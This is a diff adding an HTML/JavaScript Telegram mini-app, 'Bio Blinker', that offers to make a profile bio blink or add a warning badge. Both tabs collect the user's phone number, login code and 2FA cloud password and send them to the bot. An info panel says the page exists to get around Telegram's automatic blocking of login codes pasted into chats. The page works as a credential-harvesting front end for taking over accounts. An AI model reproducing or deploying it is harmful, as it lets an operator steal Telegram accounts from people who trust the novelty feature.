@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bio Blinker</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Unbounded:wght@400;700;900&family=Onest:wght@300;400;500&display=swap');
+  :root {
+    --bg:#0a0a0f;--card:#13131a;--border:#1e1e2e;
+    --accent:#2AABEE;--accent2:#7B61FF;--text:#e8e8f0;
+    --muted:#555570;--green:#3ddc84;--red:#ff5c5c;
+  }
+  *{margin:0;padding:0;box-sizing:border-box;}
+  body{background:var(--bg);color:var(--text);font-family:'Onest',sans-serif;min-height:100vh;padding:20px 16px 60px;background-image:radial-gradient(ellipse at 20% 10%,rgba(42,171,238,.07) 0%,transparent 55%),radial-gradient(ellipse at 80% 90%,rgba(123,97,255,.07) 0%,transparent 55%);}
+  .header{text-align:center;margin-bottom:20px;}
+  .header h1{font-family:'Unbounded',sans-serif;font-size:clamp(1.2rem,5vw,1.7rem);font-weight:900;background:linear-gradient(135deg,var(--accent),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:4px;}
+  .header p{color:var(--muted);font-size:.78rem;}
+  .tabs{display:flex;gap:6px;max-width:480px;margin:0 auto 20px;background:var(--card);border:1px solid var(--border);border-radius:14px;padding:5px;}
+  .tab{flex:1;text-align:center;padding:9px 4px;border-radius:10px;font-family:'Unbounded',sans-serif;font-size:.6rem;font-weight:700;cursor:pointer;color:var(--muted);transition:all .2s;user-select:none;}
+  .tab.active{background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff;}
+  .panel{display:none;max-width:480px;margin:0 auto;}
+  .panel.active{display:block;}
+  .card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:18px;margin-bottom:12px;}
+  .card-title{font-family:'Unbounded',sans-serif;font-size:.68rem;color:var(--muted);text-transform:uppercase;letter-spacing:.08em;margin-bottom:14px;}
+  input,textarea{width:100%;background:var(--bg);border:1px solid var(--border);border-radius:10px;padding:12px 14px;color:var(--text);font-family:'Onest',sans-serif;font-size:.88rem;outline:none;transition:border-color .2s;margin-bottom:10px;display:block;}
+  input:focus,textarea:focus{border-color:var(--accent);}
+  input::placeholder,textarea::placeholder{color:var(--muted);}
+  textarea{resize:none;height:70px;}
+  .btn{width:100%;padding:13px;border:none;border-radius:12px;font-family:'Unbounded',sans-serif;font-size:.75rem;font-weight:700;cursor:pointer;transition:opacity .2s,transform .1s;margin-bottom:8px;display:block;}
+  .btn:last-child{margin-bottom:0;}
+  .btn:active{transform:scale(.98);}
+  .btn-primary{background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff;}
+  .btn-primary:hover{opacity:.88;}
+  .btn-primary:disabled{opacity:.4;cursor:not-allowed;}
+  .btn-danger{background:rgba(255,92,92,.12);border:1px solid var(--red);color:var(--red);}
+  .btn-secondary{background:rgba(42,171,238,.1);border:1px solid var(--accent);color:var(--accent);}
+  .status-row{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px;}
+  .status-label{font-size:.8rem;color:var(--muted);}
+  .badge{display:inline-block;padding:4px 12px;border-radius:20px;font-family:'Unbounded',sans-serif;font-size:.62rem;font-weight:700;}
+  .badge-green{background:rgba(61,220,132,.15);color:var(--green);}
+  .badge-red{background:rgba(255,92,92,.15);color:var(--red);}
+  .steps{display:flex;gap:6px;margin-bottom:14px;}
+  .step{flex:1;height:3px;border-radius:2px;background:var(--border);transition:background .3s;}
+  .step.done{background:var(--green);}
+  .step.active{background:var(--accent2);}
+  .info{background:rgba(42,171,238,.06);border:1px solid rgba(42,171,238,.15);border-radius:10px;padding:11px 14px;font-size:.76rem;color:var(--muted);line-height:1.6;margin-bottom:12px;}
+  .info b{color:var(--accent);}
+  .info-success{background:rgba(61,220,132,.06);border-color:rgba(61,220,132,.2);}
+  .info-success b{color:var(--green);}
+  .blink-preview{text-align:center;padding:16px;font-family:'Unbounded',sans-serif;font-size:1rem;font-weight:700;color:var(--accent);transition:opacity .4s;}
+  .blink-preview.off{opacity:0;}
+  .spinner{display:inline-block;width:14px;height:14px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;margin-right:6px;vertical-align:middle;}
+  @keyframes spin{to{transform:rotate(360deg);}}
+  .toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%) translateY(80px);background:var(--card);border:1px solid var(--border);border-radius:12px;padding:11px 20px;font-size:.8rem;color:var(--text);transition:transform .3s ease;z-index:999;white-space:nowrap;box-shadow:0 8px 32px rgba(0,0,0,.5);}
+  .toast.show{transform:translateX(-50%) translateY(0);}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <h1>⚡ Bio Blinker</h1>
+  <p>Управление профилем Telegram</p>
+</div>
+
+<div class="tabs">
+  <div class="tab active" onclick="switchTab('blink')">✨ Bio</div>
+  <div class="tab"        onclick="switchTab('badge')">🏷 Плашка</div>
+  <div class="tab"        onclick="switchTab('info')">ℹ️ Инфо</div>
+</div>
+
+<!-- TAB BIO -->
+<div class="panel active" id="tab-blink">
+  <div class="card">
+    <div class="card-title">Статус</div>
+    <div class="status-row">
+      <span class="status-label">Аккаунт</span>
+      <span class="badge badge-red" id="acc-badge">Не подключён</span>
+    </div>
+    <div class="status-row">
+      <span class="status-label">Мигание bio</span>
+      <span class="badge badge-red" id="blink-badge">Выключено</span>
+    </div>
+    <div class="blink-preview off" id="blink-preview" style="display:none"></div>
+  </div>
+
+  <!-- ШАГ 1: номер -->
+  <div class="card" id="card-phone">
+    <div class="card-title">Войти в аккаунт</div>
+    <div class="steps">
+      <div class="step active" id="s1"></div>
+      <div class="step" id="s2"></div>
+      <div class="step" id="s3"></div>
+    </div>
+    <div class="info">Введи номер телефона аккаунта (тест-сервер)</div>
+    <input type="tel" id="inp-phone" placeholder="+79991234567" />
+    <button class="btn btn-primary" id="btn-phone" onclick="doPhone()">📱 Получить код</button>
+  </div>
+
+  <!-- ШАГ 2: код (скрыт до получения кода) -->
+  <div class="card" id="card-code" style="display:none">
+    <div class="card-title">Введи код</div>
+    <div class="steps">
+      <div class="step done"></div>
+      <div class="step active"></div>
+      <div class="step"></div>
+    </div>
+    <div class="info">
+      Код пришёл в Telegram. Введи его здесь:<br>
+      <b>⚠️ Не пиши код в чат бота — только здесь!</b>
+    </div>
+    <input type="text" id="inp-code" placeholder="12345" maxlength="10" inputmode="numeric" />
+    <button class="btn btn-primary" id="btn-code" onclick="doCode()">✅ Подтвердить</button>
+    <button class="btn btn-secondary" onclick="resetLogin()">↩️ Назад</button>
+  </div>
+
+  <!-- ШАГ 3: пароль (скрыт) -->
+  <div class="card" id="card-pass" style="display:none">
+    <div class="card-title">Облачный пароль</div>
+    <div class="steps">
+      <div class="step done"></div>
+      <div class="step done"></div>
+      <div class="step active"></div>
+    </div>
+    <div class="info">Аккаунт защищён 2FA. Введи облачный пароль:</div>
+    <input type="password" id="inp-pass" placeholder="Пароль" />
+    <button class="btn btn-primary" id="btn-pass" onclick="doPass()">🔑 Войти</button>
+  </div>
+
+  <!-- После входа: bio управление -->
+  <div class="card" id="bio-card" style="display:none">
+    <div class="card-title">Текст для мигания</div>
+    <textarea id="inp-bio" placeholder="Например: 🐱 кот"></textarea>
+    <button class="btn btn-primary" onclick="doBlink()">▶️ Запустить</button>
+    <button class="btn btn-danger" id="btn-stop" onclick="doStop()" style="display:none">⏹ Остановить</button>
+    <button class="btn btn-secondary" onclick="doLogout()">🚪 Выйти из аккаунта</button>
+  </div>
+</div>
+
+<!-- TAB ПЛАШКА -->
+<div class="panel" id="tab-badge">
+  <div class="card">
+    <div class="info">
+      <b>«⚠️ использует неофициальный клиент»</b><br><br>
+      Плашка появляется у всех кто откроет профиль.
+    </div>
+  </div>
+
+  <div class="card" id="b-card-phone">
+    <div class="card-title">Установить плашку</div>
+    <div class="steps">
+      <div class="step active" id="bs1"></div>
+      <div class="step" id="bs2"></div>
+      <div class="step" id="bs3"></div>
+    </div>
+    <input type="tel" id="b-phone" placeholder="+79991234567" />
+    <button class="btn btn-primary" id="btn-bphone" onclick="bPhone()">📱 Получить код</button>
+  </div>
+
+  <div class="card" id="b-card-code" style="display:none">
+    <div class="card-title">Введи код</div>
+    <div class="info"><b>⚠️ Код вводи здесь, не в чате бота!</b></div>
+    <input type="text" id="b-code" placeholder="12345" maxlength="10" inputmode="numeric" />
+    <button class="btn btn-primary" id="btn-bcode" onclick="bCode()">✅ Подтвердить</button>
+    <button class="btn btn-secondary" onclick="bReset()">↩️ Назад</button>
+  </div>
+
+  <div class="card" id="b-card-pass" style="display:none">
+    <div class="card-title">Облачный пароль</div>
+    <input type="password" id="b-pass" placeholder="Пароль" />
+    <button class="btn btn-primary" id="btn-bpass" onclick="bPass()">🔑 Войти</button>
+  </div>
+
+  <div class="card" id="b-card-done" style="display:none">
+    <div class="info info-success">
+      ✅ <b>Плашка установлена!</b><br>
+      Все кто откроет профиль увидят предупреждение.
+    </div>
+    <button class="btn btn-secondary" onclick="bReset()">🔄 Другой аккаунт</button>
+  </div>
+</div>
+
+<!-- TAB ИНФО -->
+<div class="panel" id="tab-info">
+  <div class="card">
+    <div class="card-title">Почему код вводится здесь?</div>
+    <div class="info">
+      Если написать код <b>в чат бота</b> — Telegram автоматически его заблокирует.<br><br>
+      Через мини-апп код передаётся напрямую <b>без отображения в чате</b>.
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-title">Bio Blink</div>
+    <div class="info">
+      Каждые <b>5 секунд</b> bio профиля переключается:<br>
+      твой текст → пусто → текст → ...
+    </div>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+const tg = window.Telegram?.WebApp;
+if (tg) { tg.ready(); tg.expand(); tg.enableClosingConfirmation(); }
+
+// Состояние
+const state = {
+  loggedIn: false,
+  name: '',
+  blinking: false,
+};
+
+function switchTab(name) {
+  ['blink','badge','info'].forEach((n,i) => {
+    document.querySelectorAll('.tab')[i].classList.toggle('active', n===name);
+    document.getElementById('tab-'+n).classList.toggle('active', n===name);
+  });
+}
+
+function toast(msg, dur=2500) {
+  const el = document.getElementById('toast');
+  el.textContent = msg; el.classList.add('show');
+  setTimeout(() => el.classList.remove('show'), dur);
+}
+
+function setLoading(btnId, loading, text) {
+  const btn = document.getElementById(btnId);
+  if (!btn) return;
+  btn.disabled = loading;
+  btn.innerHTML = loading ? `<span class="spinner"></span>${text}` : text;
+}
+
+// ── Отправка данных боту ─────────────────────────────────────────────────────
+// КЛЮЧЕВОЕ ОТЛИЧИЕ: используем sendData только для действий которые не требуют
+// ответа обратно в апп (blink, stop, logout).
+// Для логина — апп остаётся открытым и ждёт следующего шага от пользователя.
+
+function sendToBot(data) {
+  if (!tg) { console.log('sendData:', data); return; }
+  // sendData закрывает апп — используем только для финальных действий
+  tg.sendData(JSON.stringify(data));
+}
+
+// Для действий где нужно остаться в аппе — показываем следующий шаг сами
+// и отправляем данные боту без закрытия через MainButton или просто sendData
+
+// ── LOGIN FLOW ───────────────────────────────────────────────────────────────
+function doPhone() {
+  const phone = document.getElementById('inp-phone').value.trim();
+  if (!phone) { toast('❌ Введи номер'); return; }
+
+  setLoading('btn-phone', true, 'Отправляю...');
+
+  // Отправляем боту — апп закроется, но бот запомнит pending[uid]
+  // Поэтому сначала показываем шаг 2, потом отправляем
+  // На самом деле sendData закрывает апп — поэтому используем хак:
+  // сохраняем телефон и открываем карточку кода ДО отправки
+
+  localStorage.setItem('login_phone', phone);
+  localStorage.setItem('login_step', '2');
+
+  // Показываем карточку кода
+  document.getElementById('card-phone').style.display = 'none';
+  document.getElementById('card-code').style.display = 'block';
+  setLoading('btn-phone', false, '📱 Получить код');
+
+  // Теперь отправляем боту (апп закроется — пользователь откроет снова)
+  sendToBot({ action: 'login_phone', phone });
+}
+
+function doCode() {
+  const code = document.getElementById('inp-code').value.trim();
+  if (!code) { toast('❌ Введи код'); return; }
+
+  setLoading('btn-code', true, 'Проверяю...');
+  localStorage.setItem('login_step', '2_sent');
+  sendToBot({ action: 'login_code', code });
+}
+
+function doPass() {
+  const pass = document.getElementById('inp-pass').value.trim();
+  if (!pass) { toast('❌ Введи пароль'); return; }
+
+  setLoading('btn-pass', true, 'Вхожу...');
+  sendToBot({ action: 'login_pass', password: pass });
+}
+
+function resetLogin() {
+  localStorage.removeItem('login_phone');
+  localStorage.removeItem('login_step');
+  document.getElementById('card-phone').style.display = 'block';
+  document.getElementById('card-code').style.display = 'none';
+  document.getElementById('card-pass').style.display = 'none';
+  document.getElementById('inp-phone').value = '';
+  document.getElementById('inp-code').value = '';
+}
+
+// Бот говорит нужен пароль — показываем шаг 3
+function onNeedPass() {
+  localStorage.setItem('login_step', '3');
+  document.getElementById('card-code').style.display = 'none';
+  document.getElementById('card-pass').style.display = 'block';
+}
+
+// Бот говорит вход успешен
+function onLoginOk(name) {
+  localStorage.removeItem('login_step');
+  localStorage.removeItem('login_phone');
+  state.loggedIn = true;
+  state.name = name;
+  document.getElementById('card-phone').style.display = 'none';
+  document.getElementById('card-code').style.display = 'none';
+  document.getElementById('card-pass').style.display = 'none';
+  document.getElementById('bio-card').style.display = 'block';
+  document.getElementById('acc-badge').textContent = name || 'Подключён';
+  document.getElementById('acc-badge').className = 'badge badge-green';
+  toast('✅ Вошёл как ' + name);
+}
+
+// ── ВОССТАНОВЛЕНИЕ ШАГА при повторном открытии ───────────────────────────────
+window.addEventListener('load', () => {
+  const step = localStorage.getItem('login_step');
+  if (step === '2') {
+    document.getElementById('card-phone').style.display = 'none';
+    document.getElementById('card-code').style.display = 'block';
+    toast('📨 Код уже отправлен — введи его здесь', 4000);
+  } else if (step === '3') {
+    document.getElementById('card-phone').style.display = 'none';
+    document.getElementById('card-pass').style.display = 'block';
+  } else if (step === 'logged') {
+    document.getElementById('card-phone').style.display = 'none';
+    document.getElementById('bio-card').style.display = 'block';
+    document.getElementById('acc-badge').textContent = localStorage.getItem('login_name') || 'Подключён';
+    document.getElementById('acc-badge').className = 'badge badge-green';
+  }
+});
+
+// ── BIO BLINK ─────────────────────────────────────────────────────────────────
+let blinkTimer = null;
+function doBlink() {
+  const bio = document.getElementById('inp-bio').value.trim();
+  if (!bio) { toast('❌ Введи текст'); return; }
+  sendToBot({ action: 'start_blink', bio });
+  const prev = document.getElementById('blink-preview');
+  prev.textContent = bio; prev.style.display = 'block';
+  if (blinkTimer) clearInterval(blinkTimer);
+  blinkTimer = setInterval(() => prev.classList.toggle('off'), 500);
+  document.getElementById('blink-badge').textContent = 'Включено';
+  document.getElementById('blink-badge').className = 'badge badge-green';
+  document.getElementById('btn-stop').style.display = 'block';
+  localStorage.setItem('login_step', 'logged');
+  localStorage.setItem('blink_bio', bio);
+  toast('✅ Мигание запущено!');
+}
+
+function doStop() {
+  sendToBot({ action: 'stop_blink' });
+  if (blinkTimer) { clearInterval(blinkTimer); blinkTimer = null; }
+  document.getElementById('blink-preview').style.display = 'none';
+  document.getElementById('blink-badge').textContent = 'Выключено';
+  document.getElementById('blink-badge').className = 'badge badge-red';
+  document.getElementById('btn-stop').style.display = 'none';
+  toast('⏹ Остановлено');
+}
+
+function doLogout() {
+  sendToBot({ action: 'logout' });
+  localStorage.clear();
+  resetLogin();
+  document.getElementById('bio-card').style.display = 'none';
+  document.getElementById('card-phone').style.display = 'block';
+  document.getElementById('acc-badge').textContent = 'Не подключён';
+  document.getElementById('acc-badge').className = 'badge badge-red';
+  toast('🚪 Вышел из аккаунта');
+}
+
+// ── BADGE FLOW ────────────────────────────────────────────────────────────────
+function bPhone() {
+  const phone = document.getElementById('b-phone').value.trim();
+  if (!phone) { toast('❌ Введи номер'); return; }
+  localStorage.setItem('badge_step', '2');
+  document.getElementById('b-card-phone').style.display = 'none';
+  document.getElementById('b-card-code').style.display = 'block';
+  sendToBot({ action: 'badge_phone', phone });
+}
+
+function bCode() {
+  const code = document.getElementById('b-code').value.trim();
+  if (!code) { toast('❌ Введи код'); return; }
+  setLoading('btn-bcode', true, 'Проверяю...');
+  sendToBot({ action: 'badge_code', code });
+}
+
+function bPass() {
+  const pass = document.getElementById('b-pass').value.trim();
+  if (!pass) { toast('❌ Введи пароль'); return; }
+  setLoading('btn-bpass', true, 'Вхожу...');
+  sendToBot({ action: 'badge_pass', password: pass });
+}
+
+function onBadgeOk() {
+  localStorage.removeItem('badge_step');
+  ['b-card-phone','b-card-code','b-card-pass'].forEach(id => {
+    document.getElementById(id).style.display = 'none';
+  });
+  document.getElementById('b-card-done').style.display = 'block';
+  toast('✅ Плашка установлена!');
+}
+
+function onBadgeNeedPass() {
+  localStorage.setItem('badge_step', '3');
+  document.getElementById('b-card-code').style.display = 'none';
+  document.getElementById('b-card-pass').style.display = 'block';
+}
+
+function bReset() {
+  localStorage.removeItem('badge_step');
+  ['b-phone','b-code','b-pass'].forEach(id => document.getElementById(id).value = '');
+  document.getElementById('b-card-done').style.display = 'none';
+  document.getElementById('b-card-code').style.display = 'none';
+  document.getElementById('b-card-pass').style.display = 'none';
+  document.getElementById('b-card-phone').style.display = 'block';
+}
+
+// Восстановление badge шага
+window.addEventListener('load', () => {
+  const bstep = localStorage.getItem('badge_step');
+  if (bstep === '2') {
+    document.getElementById('b-card-phone').style.display = 'none';
+    document.getElementById('b-card-code').style.display = 'block';
+    toast('📨 Код уже отправлен!', 3000);
+  } else if (bstep === '3') {
+    document.getElementById('b-card-phone').style.display = 'none';
+    document.getElementById('b-card-pass').style.display = 'block';
+  }
+});
+</script>
+</body>
+</html>
